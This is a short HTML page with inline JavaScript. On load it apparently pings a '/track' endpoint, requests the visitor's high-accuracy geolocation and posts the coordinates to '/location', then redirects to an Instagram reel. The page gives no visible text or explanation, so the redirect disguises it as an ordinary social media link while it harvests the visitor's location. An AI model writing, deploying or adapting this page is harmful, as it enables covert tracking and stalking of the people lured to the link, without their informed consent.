<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body>
    <main>
        <button id="share-location" type="button"></button>
        <p id="status" role="status" aria-live="polite"></p>
    </main>

    <script>
        const button = document.getElementById("share-location");
        const status = document.getElementById("status");

        async function submitLocation(data) {
            const response = await fetch("/location", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(data)
            });

            if (!response.ok) {
                throw new Error("Failed to submit location");
            }
        }

        function requestLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve({ status: "unavailable" });
                    return;
                }

                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        resolve({
                            status: "granted",
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy
                        });
                    },
                    (error) => {
                        resolve({
                            status: error.code === error.PERMISSION_DENIED
                                ? "denied"
                                : "unavailable"
                        });
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 15000,
                        maximumAge: 0
                    }
                );
            });
        }

        async function startTracking() {
            button.hidden = true;

            try {
                const trackResponse = await fetch("/track");

                if (!trackResponse.ok) {
                    throw new Error("Failed to start tracking");
                }

                const location = await requestLocation();
                await submitLocation(location);
            } catch (error) {
                console.error(error);
            }

            window.location.href = "https://www.instagram.com/reel/DfvSDkNMCTm/?lqvp=a3B0Y3FiMTFraTBn";
        }

        startTracking();
    </script>
</body>
</html>
